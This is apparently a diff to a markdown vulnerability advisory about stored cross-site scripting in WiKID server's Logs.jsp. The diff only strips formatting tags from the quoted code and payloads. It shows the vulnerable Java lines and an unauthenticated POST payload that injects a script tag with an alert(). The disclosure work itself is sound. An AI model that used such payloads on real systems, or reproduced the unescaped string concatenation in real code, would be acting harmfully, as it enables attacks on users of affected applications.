@@ -17,7 +17,7 @@ Reviewing the source for **Logs.jsp** reveals that `rendered_message` is include
 
 ~~~
 394                 sb.append("<TD class=\"logTableCell\" style=\"white-space:normal;\">")
-395                         .append("<a href='./Log.jsp?subString=" <r:b>+ rs.getString("rendered_message") +</r:b> "'>")
+395                         .append("<a href='./Log.jsp?subString=" + rs.getString("rendered_message") + "'>")
 396                         .append("<img src='./images/toolFilter.png' alt='' border=\"0px\" width=\"15px\" height=\"15px\"/></a>")
 397                         .append(rs.getString("rendered_message").replaceAll("<", "&lt;").replaceAll(">", "&gt;"))
 398                         .append("</TD>");
@@ -32,7 +32,7 @@ A review of `wikid-server-enterprise-lib-4.2.0.jar` revealed several instance wh
 73      }
 74      catch (NumberFormatException nfe) {
 75        nfe.printStackTrace();
-76        logger.error("IO error during registration -- recieved action: " + <r:b>request.getParameter("a")</r:b>, nfe);
+76        logger.error("IO error during registration -- recieved action: " + request.getParameter("a"), nfe);
 77      } 
 ~~~
 
@@ -52,7 +52,7 @@ Upgrade-Insecure-Requests: 1=
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 60
 
-S=1&a=<r:var>test'><script>alert('InitDevice5AES - A')</script><!--</r:var>
+S=1&a=test'><script>alert('InitDevice5AES - A')</script><!--
 ~~~
 
 The JavaScript is executed whenever `Log.jsp` is visited:
@@ -62,7 +62,7 @@ The JavaScript is executed whenever `Log.jsp` is visited:
 The JavaScript is then visible in source of the page:
 
 ~~~{.html}
-<a href="./Log.jsp?subString=IO error during registration phase 1 -- recieved action: <r:var>test"><script>alert('InitDevice5AES - A')</script><!--</r:var>'><img src='./images/toolFilter.png' alt='' 
+<a href="./Log.jsp?subString=IO error during registration phase 1 -- recieved action: test"><script>alert('InitDevice5AES - A')</script><!--'><img src='./images/toolFilter.png' alt='' 
 ~~~
 
 The following parameters and endpoints are known to be vulnerable and do not require authentication:
